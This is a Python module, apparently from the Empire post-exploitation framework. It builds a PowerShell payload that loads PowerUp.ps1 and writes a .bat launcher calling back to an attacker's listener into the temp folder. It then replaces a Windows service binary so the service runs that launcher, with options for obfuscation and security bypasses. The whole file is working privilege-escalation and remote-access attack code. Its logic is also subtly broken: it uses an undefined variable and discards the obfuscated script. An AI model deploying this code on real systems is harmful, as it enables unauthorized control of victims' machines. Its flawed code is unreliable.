from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):      
        # read in the common powerup.ps1 module source code
        module_source = main_menu.installPath + "/data/module_source/privesc/PowerUp.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        service_name = params['ServiceName']

        # # get just the code needed for the specified function
        # script = helpers.generate_dynamic_powershell_script(moduleCode, "Write-ServiceEXECMD")
        script = module_code

        # generate the .bat launcher code to write out to the specified location
        launcher = main_menu.stagers.stagers['windows/launcher_bat']
        launcher.options['Listener'] = params['Listener']
        launcher.options['UserAgent'] = params['UserAgent']
        launcher.options['Proxy'] = params['Proxy']
        launcher.options['ProxyCreds'] = params['ProxyCreds']
        launcher.options['ObfuscateCommand'] = params['ObfuscateCommand']
        launcher.options['Obfuscate'] = params['Obfuscate']
        launcher.options['Bypasses'] = params['Bypasses']
        if params['Delete'].lower() == "true":
            launcher.options['Delete'] = "True"
        else:
            launcher.options['Delete'] = "False"

        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = ";$tempLoc = \"$env:temp\\debug.bat\""
        script_end += "\n$batCode = @\"\n" + launcher_code + "\"@\n"
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += "\"Launcher bat written to $tempLoc `n\";\n"
  
        if launcher_code == "":
            return handle_error_message("[!] Error in launcher .bat generation.")
        else:
            script_end += "\nInstall-ServiceBinary -ServiceName \""+str(service_name)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_1 + script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
